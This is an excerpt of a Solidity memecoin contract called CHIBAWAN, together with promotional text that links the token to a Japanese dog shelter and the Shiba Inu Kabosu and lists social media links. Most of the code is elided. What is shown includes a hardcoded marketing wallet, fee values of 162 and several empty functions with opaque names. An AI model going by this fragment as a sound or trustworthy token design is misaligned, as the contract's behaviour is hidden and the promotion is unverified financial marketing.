...
Chibawan is the Japanese animal shelter which Kabosu and Neiro called home for a while. Neiro spent 6 months living the from January 2024 until July 2024. 
Kabosu, the legedary Shiba Inu was also adopted from the same shelter in 2008.

https://chibawan.net/dogdetails/no4610-ito
https://kabochan.blog.jp/archives/9733495.html 

Telegram: https://t.me/Chibawan
Website: https://www.Chibawan.site
Twitter: https://x.com/ChibawanETH
...
contract CHIBAWAN is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletDacc = payable(0xfE2Ce540813B1B036A288bEC4bA3c6b3E66300a8);
    ...
    uint256 public _buyMarketingFee = 162;
    uint256 public _buyDeveloperFee = 0;
    
    uint256 public _sellLiquidityFee = 0;
    uint256 public _sellMarketingFee = 162;
    ...
    function matrix() public view returns (uint256) {
    } 
    function matrixo() private {
    }
    function deMatrix() external {
    }
    function reMatrix() public {
    }
    function inMomen() external {
    }
    function onMomen() external {
    }
    function reali() public {
    }                                                                                                                  
